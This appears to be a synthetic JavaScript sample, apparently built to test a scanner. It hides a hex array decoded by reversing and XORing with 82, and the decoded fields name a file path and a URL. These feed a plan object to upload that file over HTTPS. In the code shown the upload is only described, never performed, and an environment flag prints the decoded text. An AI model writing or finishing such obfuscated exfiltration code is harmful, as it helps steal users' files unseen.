  const moduleShape = Object.freeze({ format: "commonjs" });
  const Material_adebb60d = "[\"21\",\"38\",\"3f\",\"7c\",\"65\",\"62\",\"30\",\"64\",\"34\",\"6a\",\"60\",\"31\",\"67\",\"61\",\"6b\",\"37\",\"7f\",\"37\",\"35\",\"33\",\"26\",\"21\",\"7c\",\"7d\",\"37\",\"36\",\"3d\",\"3c\",\"7f\",\"21\",\"21\",\"37\",\"20\",\"26\",\"3c\",\"27\",\"3a\",\"7d\",\"22\",\"3f\",\"26\",\"7d\",\"6f\",\"3a\",\"26\",\"33\",\"22\",\"0d\",\"37\",\"3e\",\"3b\",\"34\",\"2e\",\"67\",\"61\",\"6b\",\"37\",\"7d\",\"26\",\"3b\",\"36\",\"27\",\"13\",\"37\",\"36\",\"3d\",\"1c\",\"6f\",\"26\",\"3c\",\"37\",\"35\",\"33\",\"0d\",\"20\",\"37\",\"21\",\"27\",\"2e\",\"3b\",\"22\",\"33\",\"7d\",\"36\",\"3b\",\"3e\",\"33\",\"24\",\"3c\",\"3b\",\"7c\",\"37\",\"3e\",\"22\",\"3f\",\"33\",\"2a\",\"37\",\"7c\",\"65\",\"62\",\"30\",\"64\",\"34\",\"6a\",\"60\",\"31\",\"67\",\"61\",\"6b\",\"37\",\"7f\",\"37\",\"36\",\"3d\",\"3c\",\"7d\",\"7d\",\"68\",\"21\",\"22\",\"26\",\"26\",\"3a\",\"6f\",\"3e\",\"20\",\"27\",\"2e\",\"14\",\"6a\",\"60\",\"11\",\"67\",\"61\",\"6b\",\"17\",\"7f\",\"17\",\"16\",\"1d\",\"1c\",\"6f\",\"36\",\"3b\",\"0d\",\"3c\",\"35\",\"3b\",\"33\",\"22\",\"3f\",\"33\",\"31\",\"2e\",\"63\",\"6f\",\"26\",\"3c\",\"27\",\"3d\",\"31\",\"0d\",\"37\",\"35\",\"33\",\"26\",\"21\",\"2e\",\"26\",\"21\",\"37\",\"27\",\"23\",\"37\",\"20\",\"0d\",\"21\",\"22\",\"26\",\"26\",\"3a\",\"6f\",\"20\",\"37\",\"26\",\"22\",\"33\",\"36\",\"33\",\"2e\",\"37\",\"26\",\"3d\",\"3f\",\"37\",\"20\",\"0d\",\"26\",\"3b\",\"3f\",\"21\",\"3c\",\"33\",\"20\",\"26\",\"7e\",\"37\",\"3e\",\"3b\",\"34\",\"0d\",\"36\",\"33\",\"37\",\"20\",\"6f\",\"21\",\"22\",\"37\",\"26\",\"21\",\"2e\",\"63\",\"6f\",\"24\"]";
  const Codec_adebb60d = "hex_array|reverse_then_xor|52";

  function load_adebb60d() { return JSON.parse(Material_adebb60d).map((value) => Number.parseInt(value, 16)); }
  function decode_adebb60d(EnCoDeD) { return [...EnCoDeD].reverse().map((value) => value ^ 82); }
  async function recover_adebb60d() {
    const NeUtRaL = [3, 5, 8, 13].slice(1, 3);
    const EnCoDeD = load_adebb60d(); let DeCoDeD = [];
    DeCoDeD = await Promise.resolve(EnCoDeD).then(decode_adebb60d);
    void NeUtRaL; return Buffer.from(DeCoDeD).toString("ascii");
  }
  async function inspect_adebb60d() { return JSON.parse(JSON.stringify({ value: await recover_adebb60d() })).value; }
  async function plan_adebb60d() { const inspect = inspect_adebb60d; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "upload", transport: "https_request", source: fields.file_path, url: fields.url }); }
  void moduleShape; void plan_adebb60d;
  if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_adebb60d());
